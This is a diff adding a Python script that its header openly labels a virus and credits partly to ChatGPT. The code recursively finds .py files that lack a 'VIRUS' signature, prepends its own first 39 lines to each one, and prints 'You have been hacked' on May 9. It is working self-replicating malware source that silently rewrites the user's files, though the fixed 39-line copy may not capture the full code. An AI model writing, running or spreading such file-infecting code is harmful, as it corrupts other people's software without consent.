@@ -1,0 +1,78 @@
+####DO NOT EXECUTE THE CODE###
+
+# Author:                       SEYED MEHDI HASHEMI SOHI
+# Date of latest revision:      12/14/2023
+# Purpose:                      VIRUS
+# Help source chatgpt
+# The following code is a simple representation of a Python script that mimics a basic virus.
+# The virus searches for Python files in the current directory and its subdirectories,
+# checks if they already contain the virus signature, and infects those that do not.
+# Additionally, the virus has a trigger to print a message if the current date is May 9th.
+
+import os
+import datetime
+
+# Signature that the virus searches for in target files
+SIGNATURE = "VIRUS"
+
+# Function to locate Python files in the specified directory and its subdirectories
+def locate(path):
+    # List to store targeted files
+    files_targeted = []
+    # Retrieve the list of files in the given directory
+    filelist = os.listdir(path)
+    # Iterate through each file in the directory
+    for fname in filelist:
+        # Check if the file is a directory
+        if os.path.isdir(path+"/"+fname):
+            # If it is a directory, recursively call locate to find files within it
+            files_targeted.extend(locate(path+"/"+fname))
+        # Check if the file has a ".py" extension
+        elif fname[-3:] == ".py":
+            # Flag to determine if the file is infected
+            infected = False
+            # Open the file and check each line for the virus signature
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    # Set the infected flag to True if the signature is found
+                    infected = True
+                    break
+            # If the file is not infected, add it to the list of targeted files
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    # Return the list of targeted files
+    return files_targeted
+
+# Function to infect target files with the virus
+def infect(files_targeted):
+    # Open the current script to read the virus code
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    # Read the first 39 lines of the script to extract the virus code
+    for i, line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+    # Close the virus file
+    virus.close
+    # Iterate through each targeted file
+    for fname in files_targeted:
+        # Open the target file to read its content
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        # Open the target file in write mode to overwrite its content with the virus code and original content
+        f = open(fname, "w")
+        f.write(virusstring + temp)
+        f.close()
+
+# Function to print a message if the current date is May 9th
+def detonate():
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print("You have been hacked")
+
+# Locate Python files in the current directory and its subdirectories
+files_targeted = locate(os.path.abspath(""))
+# Infect the targeted files with the virus
+infect(files_targeted)
+# Check if the detonation condition is met and print a message if true
+detonate()
